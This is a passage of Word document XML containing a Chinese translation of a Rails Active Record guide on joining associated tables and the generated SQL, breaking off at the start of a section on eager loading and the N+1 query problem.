      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="40206DDA" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1099E398" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>categories.* FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>categories</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7ABD02C6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  INNER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>JOIN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>posts ON</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>posts.category_id = categories.id</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="37230ADB" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>或者用英语说就是：“ return a Category object for all categories with posts ”。注意如果你有多个 posts 关联相同的 category 的话，就会出现重复。如果你想消除重复， 那你可以这样写： Category.joins(:post).select(“distinct(categories.id)”) 。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5664320C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>12.2.2 使用多个 Association</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4056"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="3A6EA5DE" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5CE0E2EE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="19941157"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.joins(:category, :comments)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="41DE1495" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>它会产生这样的结果：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7439"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="67B653B5" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7FC87749" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>posts.* FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>posts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="48951F95" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  INNER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>JOIN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>categories ON</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>posts.category_id = categories.id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1BE97EE8" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  INNER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>JOIN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>comments ON</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>comments.post_id = posts.id</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="58B64741" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>或者用英语说就是：“ return all posts that having a category and at least one comment ”。再次提醒有多条 comment 记录的 post 会重复出现。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63D87628" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>12.2.3 使用嵌套 Association （单层的）</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3864"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="7E4C4731" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0239CBCE" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="1260597728"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Post.joins(:comments</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :guest)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4F542D32" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>它会产生如下语句：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6599"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="30B0E206" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6B56B473" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>posts.* FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>posts</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="78557F15" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  INNER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>JOIN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>comments ON</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>comments.post_id = posts.id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02F94AA2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  INNER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>JOIN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>guest ON</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>guests.comment_id = comments.id</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0CDBCA5D" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>同样，用英语说的就是： “ return all posts that have a comment made by guest. ”。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66EF1585" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>12.2.4 使用嵌套 Association （多层的）</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6791"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="540EE7C1" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7D1970F2" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4">
            <w:pPr>
              <w:divId w:val="2072801918"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Category.joins(:posts</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; [{:comments</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :guest}, :tags])</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5ADDAA0F" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>它产生如下结果：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6839"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="5200FA29" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="04D1DE37" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>SELECT</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>categories.* FROM</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>categories</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02469284" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  INNER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>JOIN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>posts ON</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>posts.category_id = categories.id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="686F7DB6" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  INNER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>JOIN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>comments ON</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>comments.post_id = posts.id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18368BF5" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  INNER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>JOIN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>guests ON</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>guests.comment_id = comments.id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7FA40281" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  INNER</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>JOIN</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>tags ON</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>tags.post_id = posts.id</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0A89D4EF" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>12.3 指定连接表的条件表达式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64BA86B9" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">你可以使用通常的 </w:t>
      </w:r>
      <w:hyperlink r:id="rId276" w:anchor="2-2" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>数组式</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 和 </w:t>
      </w:r>
      <w:hyperlink r:id="rId277" w:anchor="2-1" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>纯字符串式</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 条件表达式来直接指定连接表的条件表达式。 </w:t>
      </w:r>
      <w:hyperlink r:id="rId278" w:anchor="2-3" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>映射表式条件表达式</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> 需要用一种特殊的语法来指定。</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7584"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="368278D9" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="62CF665C" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>time_range = (Time.now.midnight - 1.day)..Time.now.midnight</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4996BAA0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.joins(:orders).where('orders.created_at'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; time_range)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4662E5D0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>另外一种更清晰的写法是使用映射表式条件表达式</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8111"/>
      </w:tblGrid>
      <w:tr w:rsidR="00AC12D4" w14:paraId="0083EF57" w14:textId="77777777" w:rsidTr="00F61683">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5B173341" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>time_range = (Time.now.midnight - 1.day)..Time.now.midnight</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24162486" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Client.joins(:orders).where(:orders</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; {:created_at</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; time_range})</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="60819B18" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">它会使用 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>BETWEEN</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 关键字来找出所有昨天创建了 order 的 client 记录。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6727D44A" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>13 预加载 Association</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E0807C0" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">预加载是一种预先加载可能被多个 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Model.find</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 都会使用到的关联记录的机制。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="151E4E08" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>N + 1 查询问题</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A4575B" w14:textId="77777777" w:rsidR="00AC12D4" w:rsidRDefault="00AC12D4" w:rsidP="00AC12D4">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>看下面的代码：它找出 10 个 client 记录并打印出它们的 postcodes ：</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
